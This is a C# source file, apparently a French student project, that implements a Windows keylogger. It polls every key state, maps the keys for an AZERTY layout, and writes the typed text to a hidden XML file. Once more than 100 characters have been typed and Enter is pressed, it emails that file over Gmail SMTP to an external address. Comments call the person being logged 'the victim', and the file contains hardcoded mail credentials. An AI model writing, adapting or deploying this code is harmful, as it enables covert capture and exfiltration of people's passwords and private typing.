﻿using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace ProjetKeyLogger
{
    class KeyLogger
    {
        //Texte saisie depuis le dernier clic ou touche "entré" ou temps > 30 secondes
        private CollectionEnregistrement collection_enregistrement;

        private string file_path;

        //Initialisation du nombre de caractere tapé
        private int nb_caractere_tape;

        public string File_Path
        {
            get
            {
                return file_path;
            }
        }

        //Constructeur
        public KeyLogger()
        {
            //initialisation du nombre de caractere
            nb_caractere_tape = 0;

            //On initialise la collection
            collection_enregistrement = new CollectionEnregistrement();

            //Chemin pour enregistrer le fichier XML
            file_path = "TestXML.xml";

        }

        //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
        //Cette fonction vient d'une librairie stockée dans user32.dll 
        // l'argument est une "virtual key code " car chaque action est asscoiée à une clé
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int cle);

        public void capture()
        {
            //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
            Enregistrement enregistrement = new Enregistrement();
           
            bool majuscule = false;
            bool shift = false;
            bool ctrl = false;
            bool altgr = false;

            while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
            {
               
                //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                Thread.Sleep(3); //nombre en miliseconde

                //verification de l'état de chaque touche (up ou down)
                for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                {
                   
                    int statut_cle = GetAsyncKeyState(codeASCII);
                    //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
                    if (statut_cle == 32769)
                    {
                        switch (codeASCII)
                        {
                            //Si touche Entrée
                            case 13:
                                //On ajoute l'enregistrement a la collection
                                collection_enregistrement.ajouterNew(enregistrement);

                                //On réinitialise l'enregistrement
                                enregistrement = new Enregistrement();

                                //SI le nombre de caracteres tapés a dépassé la limite
                                if (nb_caractere_tape > 100)
                                {
                                    //On enregistre le contenue en xml
                                    collection_enregistrement.saveToXml(file_path);

                                    //on cache le xml
                                    File.SetAttributes(file_path, FileAttributes.Hidden);
                                    //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case

                                    //On reinitialise le nombre de caracteres
                                    nb_caractere_tape = 0;

                                    //On réinitialise la collection
                                    collection_enregistrement = new CollectionEnregistrement();

                                    //envoie du mail
                                    envoieMail();
                                }

                                break;

                            //touche shift
                            case 16:
                                shift = true;
                                break;

                            //touche majuscule
                            case 20:
                                if (majuscule == false)
                                {
                                    majuscule = true;
                                }
                                else
                                {
                                    majuscule = false;
                                }
                                break;

                            //touche effacer
                            case 8:
                                enregistrement.effacerContenu();
                                break;

                            //touche espace
                            case 9:
                                enregistrement.ajouterContenu(Char.Parse(" "));
                                break;

                            //touche suppr 
                            case 46:
                                break;

                            case 48:
                            case 49:
                            case 50:
                            case 51:
                            case 52:
                            case 53:
                            case 54:
                            case 55:
                            case 56:
                            case 57:
                                if (ctrl == true)
                                {
                                    ctrl = false;
                                }
                                else
                                {
                                    if (majuscule == false & altgr == false & shift == false)
                                    {
                                        char[] valeurs = { 'à', '&', 'é', '\"', '\'', '(', '-', 'è', '_', 'ç' };
                                        enregistrement.ajouterContenu(valeurs[codeASCII - 48]);
                                    }
                                    else
                                    {
                                        if (altgr == true)
                                        {
                                            char[] valeurs = { '@', ' ', '~', '#', '{', '[', '|', '`', '\\', '^', '"' };
                                            enregistrement.ajouterContenu(valeurs[codeASCII - 48]);
                                            altgr = false;
                                        }
                                        else
                                        {
                                            enregistrement.ajouterContenu((char)codeASCII);
                                        }
                                    }
                                }
                                break;

                            //pavé numérique
                            case 96:
                            case 97:
                            case 98:
                            case 99:
                            case 100:
                            case 101:
                            case 102:
                            case 103:
                            case 104:
                            case 105:
                                if (ctrl == true)
                                {
                                    ctrl = false;
                                }
                                else
                                {
                                    char[] valeurs = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
                                    enregistrement.ajouterContenu(valeurs[codeASCII - 96]);
                                }
                                break;

                            //Touches à côté du pavé numérique
                            case 106:
                            case 107:
                            case 109:
                            case 110:
                            case 111:
                                if (ctrl == true)
                                {
                                    ctrl = false;
                                }
                                else
                                {
                                    char[] valeurs = { '*', '+',' ', '-', '.', '/' };
                                    enregistrement.ajouterContenu(valeurs[codeASCII - 106]);
                                }
                                break;

                            //verrouillage du pavé numerique
                            case 144:
                                break;

                            //l'autre shift
                            case 160:
                            case 161:
                                shift = true;
                                break;

                            //ctrl
                            case 162:
                            case 163:
                                ctrl = true;
                                break;

                            //alt
                            case 164:
                                break;

                            //alt gr
                            case 165:
                                altgr = true;
                                break;

                            case 186:
                            case 187:
                            case 188:
                            case 190:
                            case 191:
                            case 192:
                                if (ctrl == true)
                                {
                                    ctrl = false;
                                }
                                else
                                {
                                    char[] valeurs = {'$','=',',',' ',';',':','ù','£','+','?','.','/','%','¤','}' };
                                    if ((majuscule == true | shift == true) & altgr == false)
                                    {
                                        enregistrement.ajouterContenu(valeurs[codeASCII - 179]);
                                        shift = false;
                                    }
                                    else
                                    {
                                        if (altgr == true & (codeASCII == 186 | codeASCII == 187))
                                        {
                                            enregistrement.ajouterContenu(valeurs[codeASCII - 172]);
                                            altgr = false;
                                        }
                                        else
                                        {
                                            enregistrement.ajouterContenu(valeurs[codeASCII - 186]);
                                        }
                                    }
                                }
                                break;

                            case 219:
                            case 220:
                            case 221:
                            case 222:
                            case 223:
                                if (ctrl == true)
                                {
                                    ctrl = false;
                                }
                                else
                                {
                                    char[] valeurs = { ')', '*', '^', '²', '!', '°', 'µ', '¨', '²', '§' };
                                    if ((majuscule == true | shift == true) & altgr == false)
                                    {
                                        enregistrement.ajouterContenu(valeurs[codeASCII - 214]);
                                        shift = false;
                                    }
                                    else
                                    {
                                        if (altgr == true & codeASCII == 219)
                                        {
                                            enregistrement.ajouterContenu(char.Parse("]"));
                                        }
                                        else
                                        {
                                            enregistrement.ajouterContenu(valeurs[codeASCII - 219]);
                                        }
                                    }
                                }
                                break;

                            //touches < et >
                            case 226:
                                if (ctrl == true)
                                {
                                    ctrl = false;
                                }
                                else
                                {
                                    if (shift == false)
                                    {
                                        enregistrement.ajouterContenu(char.Parse("<"));
                                    }
                                    else
                                    {
                                        enregistrement.ajouterContenu(char.Parse(">"));
                                        shift = false;
                                    }
                                }
                                break;

                            //les fleches 
                            case 37:
                            case 38:
                            case 39:
                            case 40:
                            case 255:
                                break;


                            default:
                                if (ctrl == true)
                                {
                                    ctrl = false;
                                } else
                                {
                                    if (majuscule == true | shift == true)
                                    {
                                        enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII));
                                        shift = false;
                                    }
                                    else
                                    {
                                        enregistrement.ajouterContenu(Char.ToLower((char)codeASCII));
                                    }
                                }
                                
                                //Concatenation e la derniere touche tapée au contenu de l'enregistrement
                                enregistrement.ajouterContenu((char)codeASCII);
                                //On incrémente le nombre de caracteres tapé
                                //!!!A mettre a chaque fois qu'un caractere est tapé!!!
                                nb_caractere_tape += 1;
                                break;
                        }

                    }
                   
                }

            }
        }


        //Envoie du fichier par mail
        private void envoieMail()
        {

            //recuperation du contenu du fichier
            string contenu_fichier = File.ReadAllText(file_path);

            //date du mail
            string date_mail = DateTime.Now.ToString();

            //l'object du mail
            string objet_mail = "Capture keylogger";
            //recuperation de l'adresse ip de l'ordinateur pour identifier notre victime
            var nom_ordinateur = Dns.GetHostEntry(Dns.GetHostName());

            //Création du corps du mail
            //Utiliser les autres fonctions de charlie 
            string corps_mail = "date : " + date_mail + "\n Adresse ip de la victime :" + nom_ordinateur + "\n";
            corps_mail += contenu_fichier;

            //Envoie du mail avec le protocole SMTP (utilisation d'une adresse gmail dans ce cas mais on peut changer)
            //587=numero de port de gmail
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage message_mail = new MailMessage();

            //definition de l'adresse mail qui envoie
            //Cette adresse à été crée spécialement pour ce projet à but non lucratif et seulement éducatif.
            message_mail.From = new MailAddress("camenenlythiery@gmail.com");

            //definition de l'adresse de destination 
            //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
            //site de création du mail : temp-mail.org
            message_mail.To.Add("ccamenen@outlook.fr");

            //defition de l'objet du mail
            message_mail.Subject = objet_mail;

            //En true, elle utilise les identifiant de l'utilisateur actuel. En false, elle utilise les valeurs que nous lui donnons plus bas
            client.UseDefaultCredentials = false;

            //utilisation du protocole SSL (Secure sockets Layer) pour transporter de manière sécurisée
            client.EnableSsl = true;

            //UseDefaultCredentials étant déclaré en False, il faut lui fournier les inforamtions de connexion 
            client.Credentials = new System.Net.NetworkCredential("camenenlythiery@gmail.com", "projetc#2020");

            //définition du corps du mail
            message_mail.Body = corps_mail;

            //Ajout de la pièce jointe
            System.Net.Mail.Attachment piece_jointe = new System.Net.Mail.Attachment(file_path);
            //On renomme le fichier pour pouvoir identifier notre victime
            piece_jointe.Name = Dns.GetHostName() +"_" + date_mail + ".xml";
            message_mail.Attachments.Add(piece_jointe);

            //Envoie du message
            client.Send(message_mail);

            // Libère les ressources utilisé par le fichier envoyé par mail. Cela supprime le flux et permet au programme de continuer, sans cela le programme plante.
            message_mail.Dispose();
        }
    }
}
